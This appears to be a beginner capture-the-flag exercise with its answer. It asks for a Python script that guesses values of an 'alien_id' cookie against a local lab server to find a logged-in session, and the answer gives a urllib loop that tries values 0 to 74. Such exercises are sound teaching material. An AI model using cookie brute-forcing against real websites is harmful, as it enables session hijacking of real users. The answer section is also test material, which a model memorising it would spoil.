# 🍪 Cookie Cutter - L07 C02

Remember on the last level you helped the team identify the aliens' web servers? Well now we want to attack the alien users who are logged in to that server. To do that we need to identify which are logged in.

See if you can write a script that can guess cookie values and send them to the url http://127.0.0.1:8082/cookiestore. The cookie name is alien_id.

**Tip:** Read the response for the logged in cookie value to get the flag.

> 💡 Hint: You need to keep sending different cookie values until you hit the right one.  You'll need to know how to send a cookie with urllib.request  Aside from that it sounds like a job for a loop!

## Answer

```python
import urllib.request

url = "http://127.0.0.1:8082/cookiestore"
y = 5

for i in range(75):
  request = urllib.request.Request(url)
  request.add_header("Cookie", "alien_id = "+str(i))
  response = urllib.request.urlopen(request)
  responseStr = str(response.read().decode("utf-8"))
  print(responseStr)
```
